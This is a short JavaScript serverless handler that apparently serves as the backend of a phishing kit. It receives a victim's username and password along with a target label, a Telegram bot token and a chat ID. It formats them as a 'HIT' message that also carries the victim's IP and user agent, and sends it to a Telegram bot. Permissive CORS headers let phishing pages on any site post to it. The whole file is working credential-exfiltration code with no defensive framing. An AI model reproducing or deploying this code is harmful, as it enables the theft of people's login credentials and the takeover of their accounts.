const https = require('https');

export default async function handler(req, res) {
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

    if (req.method === 'OPTIONS') return res.status(200).end();
    if (req.method !== 'POST') return res.status(405).end();

    const { target, credentials, tgToken, tgChat } = req.body;

    const message = `
🎯 **HIT: ${target.toUpperCase()}**
👤 **USER:** \`${credentials.username}\`
🔑 **PASS:** \`${credentials.password}\`
🌐 **IP:** ${req.headers['x-forwarded-for'] || 'HIDDEN'}
📱 **UA:** ${req.headers['user-agent']}
    `;

    const data = JSON.stringify({ chat_id: tgChat, text: message, parse_mode: 'Markdown' });

    const options = {
        hostname: 'api.telegram.org',
        port: 443,
        path: `/bot${tgToken}/sendMessage`,
        method: 'POST',
        headers: { 'Content-Type': 'application/json', 'Content-Length': data.length }
    };

    const postReq = https.request(options, (postRes) => {
        postRes.on('end', () => res.status(200).json({ s: 1 }));
    });

    postReq.write(data);
    postReq.end();
}
